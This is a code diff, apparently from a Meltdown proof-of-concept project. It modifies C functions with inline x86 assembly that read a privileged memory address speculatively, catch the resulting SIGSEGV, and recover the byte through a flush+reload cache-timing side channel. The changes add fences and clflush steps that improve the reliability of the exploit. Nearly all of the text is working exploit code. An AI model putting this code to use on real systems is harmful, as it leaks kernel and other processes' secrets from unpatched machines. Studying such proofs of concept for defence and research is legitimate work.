@@ -39,25 +39,26 @@ static void sigsegv_handler(int sig, siginfo_t *info, void *uap)
 {
     int i, mini = 0;
     uint64_t t, mint = 0;
-    uintptr_t curr;
+    uintptr_t p;
 
     for (i = 0; i < BYTE_NUM; i++)
     {
-        curr = (uintptr_t)_tube + i * CHUNK_SIZE;
+        p = (uintptr_t)_tube + i * CHUNK_SIZE;
 
         // measure
         __asm__ __volatile__(
-            "lfence             \n\t" // fix out-of-order execution
-            "rdtsc              \n\t" // read TSC
-            "movq %%rax,  %0    \n\t" // save TSC
-            "movb (%1),   %%al  \n\t" // access curr
-            "lfence             \n\t" // fix out-of-order execution
-            "rdtsc              \n\t" // read TSC
-            "subq %0,     %%rax \n\t" // diff TSC
-            "mov %%rax,   %0    \n\t" // output
-            : "=&r"(t)
-            : "r"(curr)
-            : "rdx", "rax"); // RDX and RAX are affected by RDTSC
+            "mfence                 \n\t"
+            "rdtsc                  \n\t" // read TSC
+            "lfence                 \n\t"
+            "movq    %%rax, %%rcx   \n\t" // save TSC
+            "movb    (%[p]), %%al   \n\t" // access tube
+            "lfence                 \n\t"
+            "rdtsc                  \n\t" // read TSC
+            "subq    %%rcx, %%rax   \n\t" // diff TSC
+            "clflush (%[p])         \n\t" // clflush
+            : "=&a"(t)
+            : [p] "r"(p)
+            : "rdx", "rcx"); // RDX are affected by RDTSC, RCX is used
 
         if (mint == 0 || t < mint)
         {
@@ -75,12 +76,24 @@ static void sigsegv_handler(int sig, siginfo_t *info, void *uap)
 
 int meltdown(uintptr_t addr, uint8_t *val)
 {
-    int ret;
+    int ret, i;
+    uint64_t p;
     struct sigaction sa;
 
     // alloc _tube
     if ((ret = posix_memalign((void **)&_tube, CHUNK_SIZE, BYTE_NUM * CHUNK_SIZE)) != 0)
         goto exit;
+
+    // clflush all
+    for (i = 0; i < BYTE_NUM; i++)
+    {
+        p = (uint64_t)_tube + i * CHUNK_SIZE;
+        __asm__ __volatile__(
+            "lfence         \n\t"
+            "clflush (%[p]) \n\t"
+            :
+            : [p] "r"(p));
+    }
 
     // install signal handler
     sa.sa_sigaction = sigsegv_handler;
@@ -91,19 +104,22 @@ int meltdown(uintptr_t addr, uint8_t *val)
 
     // catch SIGSEGV
     if (sigsetjmp(_jmp_buf, 0))
-        goto exit;
+        goto cont;
 
     // probe
     __asm__ __volatile__(
-        "xorq %%rax, %%rax      \n\t" // clear RAX
-        "retry:                 \n\t" // retry (?)
-        "movb (%0), %%al        \n\t" // read addr, this will raise SIGSEGV
-        "shlq %2,   %%rax       \n\t" // shift left
-        "jz retry               \n\t" // jz retry (?)
-        "movb (%1, %%rax), %%al \n\t" // read from tube
+        "mfence                         \n\t" // mfence
+        "xorq   %%rax, %%rax            \n\t" // clear RAX
+        "%=:                            \n\t" // retry (?)
+        "movb   (%[addr]), %%al         \n\t" // read addr, this will raise SIGSEGV
+        "shlq   %[SHIFT], %%rax         \n\t" // shift left
+        "jz     %=b                     \n\t" // jz retry (?)
+        "movq   (%[tube], %%rax), %%rax \n\t" // read from tube
         :
-        : "r"(addr), "r"(_tube), "J"(CHUNK_SHIFT)
+        : [addr] "r"(addr), [tube] "r"(_tube), [SHIFT] "J"(CHUNK_SHIFT)
         : "rax"); // RAX is used internally
+
+cont:
 
     *val = _val;
 
